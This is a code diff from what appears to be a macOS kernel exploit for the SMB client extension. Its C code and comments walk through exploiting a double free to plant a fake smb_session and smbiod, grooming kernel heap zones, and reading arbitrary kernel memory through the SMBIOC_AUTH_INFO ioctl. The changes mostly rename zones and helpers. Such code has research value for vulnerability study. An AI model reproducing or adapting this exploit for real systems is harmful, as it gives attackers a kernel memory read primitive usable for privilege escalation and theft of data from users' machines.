@@ -34,16 +34,16 @@
 ///
 /// The aribitary kernel memory reader implementation below works by constructing a fake
 /// smb_session (`struct smb_session`) pointing to a fake iod (`struct smbiod`). The
-/// `memory/zkext_alloc_small allocator.c` can be used for allocating controlled data in kernel
-/// memory (upto 256 bytes) and the address of allocated memory will be returned. This allocator
-/// can be used for constructing `fake_smb_session` and `fake_iod`. The double free vulnerability
-/// exploited in `smb_dev_rw.c` can be used to achieve slow read / write access to a smb dev
-/// (`struct smb_dev`) stored in kext.48 zone. By replacing the value of pointer `smb_dev->sd_session`
-/// to the the created fake smb_session, we can achieve arbitary kernel memory read. The
-/// fake_iod pointed by `fake_session->iod_tailq_head.tqh_first` will have the value of
-/// `fake_iod->iod_gss.gss_cpn` set to the address of kernel memory from where data is to be
-/// read and `fake_iod->iod_gss.gss_cpn_len` set to the length of data to be read from memory.
-/// Then the data from kernel memory can then be read using SMBIOC_AUTH_INFO ioctl command
+/// `memory/kheap_alloc.c` can be used for allocating controlled data in kernel memory (upto
+/// 256 bytes) and the address of allocated memory will be returned. This allocator can be used
+/// for constructing `fake_smb_session` and `fake_iod`. The double free vulnerability exploited
+/// in `smb_dev_rw.c` can be used to achieve slow read / write access to a smb dev (`struct smb_dev`)
+/// stored in default.48 zone. By replacing the value of pointer `smb_dev->sd_session` to the the
+/// created fake smb_session, we can achieve arbitary kernel memory read. The fake_iod pointed
+/// by `fake_session->iod_tailq_head.tqh_first` will have the value of `fake_iod->iod_gss.gss_cpn`
+/// set to the address of kernel memory from where data is to be read and
+/// `fake_iod->iod_gss.gss_cpn_len` set to the length of data to be read from memory. Then the
+/// data from kernel memory can then be read using SMBIOC_AUTH_INFO ioctl command
 ///
 /// Inorder to avoid having to construct new fake smb_session and fake iod for each kernel memory
 /// read (which is slow and may fail), we set the value of pointer
@@ -69,15 +69,15 @@ struct kmem_read_session {
 };
 
 
-/// We will be performing a lot of OOB reads from kext.32 zone for reading the address of socket
+/// We will be performing a lot of OOB reads from default.32 zone for reading the address of socket
 /// addresses allocated using `SMBIOC_UPDATE_CLIENT_INTERFACES` ioctl command.
-/// Fragmenting the kext.32 zone will help us avoid kernel data abort panics due to bad OOB
+/// Fragmenting the default.32 zone will help us avoid kernel data abort panics due to bad OOB
 /// read in page boundary.
-void kmem_read_session_fragment_kext_32(const struct sockaddr_in* smb_addr, xpl_allocator_nrnw_t nrnw_allocator) {
+void kmem_read_session_fragment_default_32(const struct sockaddr_in* smb_addr, xpl_allocator_nrnw_t nrnw_allocator) {
     xpl_allocator_nrnw_t gap_allocator = xpl_allocator_nrnw_create(smb_addr);
     for (int i=0; i<NUM_KEXT_32_FRAGMENTED_PAGES; i++) {
         xpl_allocator_nrnw_allocate(nrnw_allocator, 32, 2);
-        xpl_allocator_nrnw_allocate(gap_allocator, 32, (xpl_PAGE_SIZE / 32) - 2);
+        xpl_allocator_nrnw_allocate(gap_allocator, 32, (XPL_PAGE_SIZE / 32) - 2);
     }
     xpl_allocator_nrnw_destroy(&gap_allocator);
 }
@@ -90,9 +90,9 @@ void kmem_read_session_build_sock_addr(kmem_read_session_t session, const struct
     xpl_assert_cond(session->sock_addr_addr, ==, 0);
     
     /// `xpl_kheap_alloc` reads the address of allocated memory by reading the field `addr` of
-    /// `struct sock_addr_entry` allocated in kext.32 zone. Since there may be other `sock_addr_entry`
+    /// `struct sock_addr_entry` allocated in default.32 zone. Since there may be other `sock_addr_entry`
     /// with `addr` pointing to different data, we need a way to distinguish others from our allocation.
-    /// To do this we set the size of allocated data to 224 which will get allocated in kext.224 zone.
+    /// To do this we set the size of allocated data to 224 which will get allocated in default.224 zone.
     /// Now we can distinguish others by checking whether the leaked `sock_addr_entry->addr
     /// & (PAGE_SIZE - 1)` value is divisible by 224
     struct xpl_kheap_alloc_entry entry = xpl_kheap_alloc(smb_addr, 224, AF_INET, (char*)&FAKE_SESSION_NIC_ADDR, sizeof(FAKE_SESSION_NIC_ADDR), 8);
@@ -117,7 +117,7 @@ void kmem_read_session_build_sock_addr_entry(kmem_read_session_t session, const 
     bzero(&saddr_entry, sizeof(saddr_entry));
     saddr_entry.addr = (struct sockaddr*)session->sock_addr_addr;
     
-    /// Allocating on kext.160 to identify the correct address. See notes in kmem_read_session_build_sock_addr function
+    /// Allocating on default.160 to identify the correct allocation. See notes in kmem_read_session_build_sock_addr function
     struct xpl_kheap_alloc_entry entry = xpl_kheap_alloc(smb_addr, 160, AF_INET, (char*)&saddr_entry, sizeof(saddr_entry), 8);
     
     /// First 8 bytes of allocated memory is used for storing actual socket address
@@ -135,7 +135,7 @@ void kmem_read_session_build_sock_addr_entry(kmem_read_session_t session, const 
 /// The fields `iod_ref_cnt`, `iod_gss`, `iod_flags` and `iod_session` are used in the code path
 /// handling `SMBIOC_AUTH_INFO` ioctl command. All these fields cannot be incorporated into
 /// a single 256 byte data allocation. Hence the function below aligns the data such that if the
-/// allocated fake_iod is preceeded by another fake_iod, it is valid. Since the zkext_alloc_small
+/// allocated fake_iod is preceeded by another fake_iod, it is valid. Since the `xpl_kheap_alloc`
 /// make a lot of allocations using same data to read the allocated address, it is likely to have a
 /// fake_iod predecessor. In the rare event that the predecessor is not a fake_iod, the
 /// `fake_iod->iod_flags` will likely have invalid value which will lead to `SMBIOC_AUTH_INFO`
@@ -151,7 +151,7 @@ void kmem_read_session_build_iod(kmem_read_session_t session, const struct socka
     size_t fake_iod_start = offsetof(struct smbiod, iod_tdata);
     size_t fake_iod_end = fake_iod_start + 248;
     
-    /// Firrst 8 bytes of the allocated data is used for storing the actual socket address
+    /// First 8 bytes of the allocated data is used for storing the actual socket address
     /// Mark this area so that assertions below will fail when this area is used by any required fields
     *((uintptr_t*)((char*)&fake_iod + fake_iod_start - 8)) = 0xabcdef1234567890;
     
@@ -199,7 +199,7 @@ void kmem_read_session_build_iod(kmem_read_session_t session, const struct socka
 
 /// Builds the fake smb_session. The `struct smb_session` is larger than 256 bytes, but the fields
 /// used in codepaths handling `SMBIOC_AUTH_INFO` and `SMBIOC_UPDATE_CLIENT_INTERFACES`
-/// can be represented using a kext.224 allocation. This fake smb_session will be set as the value
+/// can be incorporated into a default.224 allocation. This fake smb_session will be set as the value
 /// of pointer `smb_dev->sd_session` by exploiting double free vulnerability using `smb_dev_rw.c`
 void kmem_read_session_build_session(kmem_read_session_t session, const struct sockaddr_in* smb_addr) {
     xpl_assert(session->iod_addr != 0);
@@ -223,7 +223,7 @@ void kmem_read_session_build_session(kmem_read_session_t session, const struct s
     
     static_assert((TYPE_SMB_SESSION_MEM_SESSION_INTERFACE_TABLE_OFFSET + offsetof(struct session_network_interface_info, client_if_blacklist_len) - TYPE_SMB_SESSION_MEM_IOD_TAILQ_LOCK_OFFSET) <= sizeof(kmem_read_session), "");
     
-    /// Allocating on kext.224 to identify the correct address. See notes in kmem_read_session_build_sock_addr function
+    /// Allocating on default.224 to identify the correct address. See notes in kmem_read_session_build_sock_addr function
     struct xpl_kheap_alloc_entry kmem_read_session_alloc = xpl_kheap_alloc(smb_addr, 224, AF_INET, kmem_read_session, sizeof(kmem_read_session), 8);
     uintptr_t kmem_read_session_addr = kmem_read_session_alloc.address + 8 - base;
     
@@ -236,21 +236,23 @@ void kmem_read_session_build_session(kmem_read_session_t session, const struct s
 
 kmem_read_session_t kmem_read_session_create(const struct sockaddr_in* smb_addr) {
     xpl_allocator_nrnw_t nrnw_allocator = xpl_allocator_nrnw_create(smb_addr);
-    kmem_read_session_fragment_kext_32(smb_addr, nrnw_allocator);
+    kmem_read_session_fragment_default_32(smb_addr, nrnw_allocator);
     
     kmem_read_session_t kmem_read_session = malloc(sizeof(struct kmem_read_session));
     bzero(kmem_read_session, sizeof(struct kmem_read_session));
     
-    xpl_allocator_nrnw_allocate(nrnw_allocator, 32, xpl_PAGE_SIZE / 32 * 16);
+    /// Make preallocations on default.32 zone to help `xe_kheap_alloc` identify the correct
+    /// allocated address
+    xpl_allocator_nrnw_allocate(nrnw_allocator, 32, XPL_PAGE_SIZE / 32 * 16);
     kmem_read_session_build_sock_addr(kmem_read_session, smb_addr);
     
-    xpl_allocator_nrnw_allocate(nrnw_allocator, 32, xpl_PAGE_SIZE / 32 * 16);
+    xpl_allocator_nrnw_allocate(nrnw_allocator, 32, XPL_PAGE_SIZE / 32 * 16);
     kmem_read_session_build_sock_addr_entry(kmem_read_session, smb_addr);
     
-    xpl_allocator_nrnw_allocate(nrnw_allocator, 32, xpl_PAGE_SIZE / 32 * 16);
+    xpl_allocator_nrnw_allocate(nrnw_allocator, 32, XPL_PAGE_SIZE / 32 * 16);
     kmem_read_session_build_iod(kmem_read_session, smb_addr);
     
-    xpl_allocator_nrnw_allocate(nrnw_allocator, 32, xpl_PAGE_SIZE / 32 * 16);
+    xpl_allocator_nrnw_allocate(nrnw_allocator, 32, XPL_PAGE_SIZE / 32 * 16);
     kmem_read_session_build_session(kmem_read_session, smb_addr);
     
     xpl_allocator_nrnw_destroy(&nrnw_allocator);
